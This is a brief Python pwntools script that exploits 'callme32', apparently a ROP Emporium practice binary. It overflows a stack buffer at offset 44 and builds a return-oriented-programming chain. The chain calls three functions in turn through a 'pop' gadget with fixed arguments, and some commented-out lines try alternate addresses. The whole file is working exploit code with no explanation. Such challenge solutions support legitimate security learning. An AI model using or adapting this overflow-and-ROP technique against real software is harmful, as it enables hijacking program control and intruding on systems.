from pwn import *

r = process('callme32')
raw_input()

offset = 44
#cat_falg_addr = 0xffffd1b0
#cat_flag_code = 'cat flag\n'
#p = cat_flag_code + 'a' * (44 - len(cat_flag_code))

pop_3 = p32(0x08048576) # add esp, 8 ; pop ebx ; ret

p = 'a' * 44
#p += p32(0x804a018) + pop_3 + p32(1) + p32(2) + p32(3)
#p += p32(0x804a030) + pop_3 + p32(1) + p32(2) + p32(3)
#p += p32(0x804a014) + pop_3 + p32(1) + p32(2) + p32(3)

p += p32(0x080485c0) + pop_3 + p32(1) + p32(2) + p32(3)
p += p32(0x08048620) + pop_3 + p32(1) + p32(2) + p32(3)
p += p32(0x080485b0) + pop_3 + p32(1) + p32(2) + p32(3)

r.sendline(p)


r.interactive()
